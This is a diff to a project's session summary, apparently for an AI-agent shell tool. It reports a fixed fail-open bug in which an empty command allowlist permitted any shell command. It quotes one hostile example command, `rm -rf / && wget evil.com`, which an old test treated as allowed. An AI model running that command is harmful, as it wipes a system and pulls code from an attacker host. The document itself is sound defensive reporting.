@@ -44,11 +44,25 @@ Draft PR: https://github.com/MissyLabs/missy/pull/31
     `subprocess.run`, the fix needed `subprocess.Popen`) — tracked as
     task #17 for a dedicated session.
 
-**Four independent, confirmed critical authorization-bypass
+11. **SR-1.8**: found and fixed a fifth critical finding —
+    `ShellPolicyEngine.check_command()` treated an empty
+    `allowed_commands` list as allow-all whenever `shell.enabled: true`,
+    directly contradicting `ShellPolicy`'s own docstring and every piece
+    of operator-facing documentation, all of which already correctly
+    promised deny-all. A pre-existing test literally asserted
+    `rm -rf / && wget evil.com` passed policy under that exact default
+    config. Fixed the implementation to match its own documented
+    contract; no doc changes needed.
+12. Updated the four other required session artifacts
+    (`BUILD_RESULTS.md`, `TEST_EDGE_CASES.md`, `AUDIT_CONNECTIVITY.md`,
+    `OPENCLAW_GAP_ANALYSIS.md`) which hadn't been touched since the
+    prior tool-intelligence-overhaul session.
+
+**Five independent, confirmed critical authorization-bypass
 vulnerabilities** found and fixed this session (SR-1.2/1.3, SR-1.12,
-SR-1.13 ×2), all the same underlying pattern: an unauthenticated action
-reachable before the policy gate. Plus the FX-A/B/C/D/F/G validation-
-harness root causes.
+SR-1.13 ×2, SR-1.8), all the same underlying pattern: an unauthenticated
+or unrestricted action reachable due to a fail-open default or missing
+gate. Plus the FX-A/B/C/D/F/G validation-harness root causes.
 
 **All of FX-A through FX-G are now done** per the prompt's stated
 dependency order (some with residual/deferred sub-items tracked as
@@ -61,7 +75,7 @@ python3 -m pytest tests/ -q -o faulthandler_timeout=120 \
   --deselect tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl \
   --deselect tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped \
   --deselect tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl
-20754 passed, 13 skipped, 3 deselected in 447.40s (0:07:27)
+20755 passed, 13 skipped, 3 deselected in 460.03s (0:07:40)
 ```
 
 Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
